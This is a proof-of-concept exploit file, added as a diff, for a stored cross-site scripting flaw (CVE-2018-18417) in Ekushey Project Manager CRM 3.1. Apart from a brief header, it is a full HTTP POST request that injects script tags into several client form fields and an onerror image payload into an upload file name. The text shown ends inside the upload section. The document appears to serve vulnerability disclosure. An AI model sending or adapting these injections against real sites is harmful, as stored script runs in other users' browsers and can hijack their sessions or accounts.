@@ -1,0 +1,76 @@
+# Exploit Title: Ekushey Project Manager CRM 3.1 - Cross-Site Scripting
+# Date: 2018-10-16
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: http://creativeitem.com/
+# Software Link : http://creativeitem.com/demo/ekushey/
+# Software : Ekushey Project Manager CRM
+# Version : 3.1
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : CVE-2018-18417
+
+# In the 3.1 version of Ekushey Project Manager CRM, Stored XSS has been discovered in the input and upload
+# sections, as demonstrated by the name parameter to the index.php/admin/client/create URI.
+ 
+# HTTP POST Request :
+
+POST /demo/ekushey/index.php/admin/client/create HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/demo/ekushey/index.php/admin/client
+Content-Type: multipart/form-data; boundary=---------------------------19725691145690149721005243204
+Content-Length: 1576033
+Cookie: ci_session=bvug3n8aq64rpuft843qq986fhl077vq
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="name"
+
+"><script>alert("ismailtasdelen")</script>
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="email"
+
+test@ismailtasdelen.me
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="password"
+
+Passw0rd
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="address"
+
+"><script>alert("ismailtasdelen")</script>
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="phone"
+
++100200300205
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="website"
+
+https://ismailtasdelen.me
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="skype_id"
+
+ismailtasdelen
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="facebook_profile_link"
+
+ismailtasdelen
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="linkedin_profile_link"
+
+ismailtasdelen
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="twitter_profile_link"
+
+ismailtasdelen
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="short_note"
+
+"><script>alert("ismailtasdelen")</script>
+-----------------------------19725691145690149721005243204
+Content-Disposition: form-data; name="userfile"; filename="\"><img src=x onerror=alert(\"ismailtasdelen\")>.jpg"
+Content-Type: image/jpeg
